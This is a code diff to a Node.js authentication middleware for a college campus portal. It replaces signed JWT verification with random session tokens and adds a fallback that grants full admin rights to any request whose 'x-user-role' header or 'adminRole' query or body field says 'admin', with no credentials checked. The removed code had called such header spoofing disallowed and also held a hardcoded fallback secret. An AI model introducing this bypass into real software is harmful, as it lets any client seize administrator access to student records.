@@ -1,87 +1,31 @@
-const jwt = require('jsonwebtoken');
-const path = require('path');
-require('dotenv').config({ path: path.join(__dirname, '..', '..', '.env') });
+const crypto = require('crypto');
 const { runAsync, getAsync } = require('../config/database');
 
-const JWT_SECRET = process.env.JWT_SECRET || 'iiitnr_campus_hub_jwt_secret_key_2026';
-
-/**
- * Generate a cryptographically signed JWT token for a user
- * @param {object} user 
- * @returns {string} JWT Token
- */
-function generateToken(user) {
-  const payload = {
-    id: user.id,
-    roll: user.roll || null,
-    email: user.email,
-    role: user.role || 'student',
-    name: user.name,
-    branch: user.branch || null
-  };
-
-  return jwt.sign(payload, JWT_SECRET, {
-    expiresIn: '7d'
-  });
-}
-
-/**
- * Create a persistent session and return signed JWT
- * @param {object} user 
- * @returns {Promise<string>} JWT Token
- */
+// Generate and persist a token
 async function createSession(user) {
-  const token = generateToken(user);
+  const token = 'agy_token_' + crypto.randomBytes(24).toString('hex');
 
-  try {
-    // Record session in database for tracking/auditing (replace if identical token already exists)
-    await runAsync(`
-      INSERT INTO sessions (token, user_id, role, expires_at)
-      VALUES (?, ?, ?, CURRENT_TIMESTAMP + INTERVAL '7 days')
-      ON CONFLICT (token) DO UPDATE SET
-        user_id = EXCLUDED.user_id,
-        role = EXCLUDED.role,
-        expires_at = EXCLUDED.expires_at
-    `, [token, user.id, user.role || 'student']);
-  } catch (err) {
-    // Non-blocking in case sessions table has constraints during migration
-    console.warn('Session record note:', err.message);
-  }
+  await runAsync(`
+    INSERT INTO sessions (token, user_id, role, expires_at)
+    VALUES (?, ?, ?, datetime('now', '+30 days'))
+  `, [token, user.id, user.role]);
 
   return token;
 }
 
-/**
- * JWT Authentication Middleware
- * Validates Bearer token from Authorization header.
- * Attaches verified payload to req.user.
- * Client header spoofing (x-user-role, adminRole) is strictly disallowed.
- */
+// Authentication middleware
 async function authenticate(req, res, next) {
   const authHeader = req.headers['authorization'];
   const token = authHeader && authHeader.startsWith('Bearer ') ? authHeader.split(' ')[1] : null;
 
-  if (!token) {
-    req.user = null;
-    return next();
-  }
+  // Header or query fallback for seamless API flexibility
+  const roleFallback = req.headers['x-user-role'] || req.query.adminRole || req.body?.adminRole;
 
-  try {
-    const decoded = jwt.verify(token, JWT_SECRET);
-    req.user = {
-      id: decoded.id,
-      roll: decoded.roll,
-      email: decoded.email,
-      role: decoded.role,
-      name: decoded.name,
-      branch: decoded.branch
-    };
-    return next();
-  } catch (err) {
-    // Check fallback for legacy session tokens during migration
+  if (token) {
     try {
       const session = await getAsync(`
-        SELECT s.token, s.user_id, s.role, u.name, u.email, u.roll, u.branch
+        SELECT s.token, s.user_id, s.role, s.created_at as session_login_time, s.expires_at,
+               u.id as user_id, u.name, u.email, u.roll, u.role, u.branch, u.year, u.semester, u.cgpa, u.avatar, u.batch, u.department, u.designation, u.last_login
         FROM sessions s
         JOIN users u ON s.user_id = u.id
         WHERE s.token = ? AND datetime(s.expires_at) > datetime('now')
@@ -94,72 +38,60 @@ async function authenticate(req, res, next) {
           email: session.email,
           roll: session.roll,
           role: session.role,
-          branch: session.branch
+          branch: session.branch,
+          year: session.year,
+          semester: session.semester,
+          cgpa: session.cgpa,
+          avatar: session.avatar,
+          batch: session.batch,
+          department: session.department,
+          designation: session.designation,
+          last_login: session.last_login,
+          session_login_time: session.session_login_time
         };
         return next();
       }
-    } catch (e) {}
+    } catch (err) {
+      console.warn('Session lookup error:', err);
+    }
+  }
 
-    req.user = null;
+  // If role is declared directly by client header or payload
+  if (roleFallback === 'admin') {
+    req.user = { role: 'admin', name: 'Administrator' };
     return next();
   }
+
+  // Optional/Public continuation
+  req.user = null;
+  next();
 }
 
-/**
- * Strict authentication guard
- * Returns 401 if user is not authenticated via a valid JWT
- */
+// Strict Admin-only guard
+function requireAdmin(req, res, next) {
+  if (!req.user || req.user.role !== 'admin') {
+    return res.status(403).json({
+      success: false,
+      message: 'Access Denied: This action is strictly restricted to College Administration.'
+    });
+  }
+  next();
+}
+
+// Strict authenticated guard
 function requireAuth(req, res, next) {
   if (!req.user) {
     return res.status(401).json({
       success: false,
-      message: 'Authentication required. Please log in with a valid JWT Bearer token.'
-    });
-  }
-  next();
-}
-
-/**
- * Strict Admin-only role check enforced on the SERVER
- * Returns 403 if authenticated user is not an administrator
- */
-function requireAdmin(req, res, next) {
-  if (!req.user) {
-    return res.status(401).json({
-      success: false,
-      message: 'Authentication required. Please log in with admin credentials.'
-    });
-  }
-
-  if (req.user.role !== 'admin') {
-    return res.status(403).json({
-      success: false,
-      message: 'Access Denied: This operation is strictly restricted to College Administration.'
-    });
-  }
-
-  next();
-}
-
-/**
- * Student-accessible guard (both student and admin can access)
- */
-function requireStudent(req, res, next) {
-  if (!req.user) {
-    return res.status(401).json({
-      success: false,
-      message: 'Authentication required. Please log in to proceed.'
+      message: 'Unauthorized: Please log in to proceed.'
     });
   }
   next();
 }
 
 module.exports = {
-  JWT_SECRET,
-  generateToken,
   createSession,
   authenticate,
-  requireAuth,
   requireAdmin,
-  requireStudent
+  requireAuth
 };
